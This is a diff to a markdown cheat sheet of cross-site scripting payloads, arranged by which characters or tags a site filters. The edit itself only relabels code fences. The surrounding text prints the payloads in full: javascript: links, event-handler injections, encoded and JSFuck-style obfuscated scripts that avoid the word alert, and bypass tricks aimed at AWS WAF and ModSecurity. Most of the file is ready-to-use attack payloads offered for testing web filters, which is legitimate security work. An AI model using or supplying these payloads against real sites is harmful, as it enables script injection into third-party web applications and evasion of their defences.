@@ -1,7 +1,7 @@
 ### 1.If you cannot escape from the attribute (" is being encoded or deleted)
 
 Try to use this payloads :
-```
+```js
 1) <a href="javascript:alert(1)">Click</a>
 
 2) <a href="&#01;javascript:alert(1)">Click</a>
@@ -12,14 +12,14 @@ Try to use this payloads :
 
 ```
 Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:
-```
+```js
 4) \u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
 ```
 
 ### 2.If you can escape from the attribute but not from the tag (> is encoded or deleted)
 
 Try to event handlers :
-```
+```js
 1) <input   value"XXXXXXX"   onclick=alert(1)  >Click</input>
 
 2) <input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" >
@@ -31,7 +31,7 @@ Try to event handlers :
 5) <a  href=https://google.com onclick=alert(document.location.hash.substring(1))#{saasasasas}>Click</a>
 ```
 or use encodes:
-```
+```js
 %3cscript%3e
 %253cscript%253e
 &lt;script&gt;
@@ -43,7 +43,7 @@ or use encodes:
 ### 3.If alert is encoded or deleted
 
 Try to use this payloads :
-```
+```js
 1) <script>$='',_=!$+$,$$=!_+$,$_=$+{},_$=_[$++],__=_[_$$=$],_$_=++_$$+$,$$$=$_[_$$+_$_],_[$$$+=$_[$]+(_.$$+$_)[$]+$$[_$_]+_$+__+_[_$$]+$$$+_$+$_[$]+__][$$$]($$[$]+$$[_$$]+_[_$_]+__+_$+"($)")()</script>
 
 2) <script>[[,$,_,$$,__,$_,_$,$$$,$__,,___]=[![]+[]+!![]][+[]]+[][[]]],$$_=[][$+$_],[,,,$_$,,,_$$,,,,,__$,_$_]=[...$$_+[]],$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$$$_[$_$+_$$+___+$$+$_+_$+$$$+$_$+$_+_$$+_$]($+_+__+_$+$_+__$+[+!!$]+_$_)()</script>
@@ -188,23 +188,23 @@ Try to use this payloads :
 ```
 
 ### 4.If space is encoded or deleted
-```
+```js
 use tab url encode : %09
 <input%09value"XXXXXXX"%09onclick=alert(1)>Click</input>
 ```
 
 ### 5.If () is encoded or deleted
-```
+```js
 <script>alert`1`</script>
 ```
 
 ### 5.If <script> is encoded or deleted try other tags like:
-```
+```js
 SVG, img, iframe 
 ```
    
 ### 6.Some WAF bypass:
-```
+```js
 @vanshitmalhotra | Bypass AWS WAF -// 
 Add "<!" (without quotes) before your payload and bypass that WAF. :)
 eg: <!<script>confirm(1)</script>
@@ -233,6 +233,6 @@ rodolfoassis | ModSecurity CRS 3.2.0 PL1
 ``` 
 
 ### 7.Some good stuffs:
-```
+```js
 https://github.com/Walidhossain010/WAF-bypass-xss-payloads   
 ```
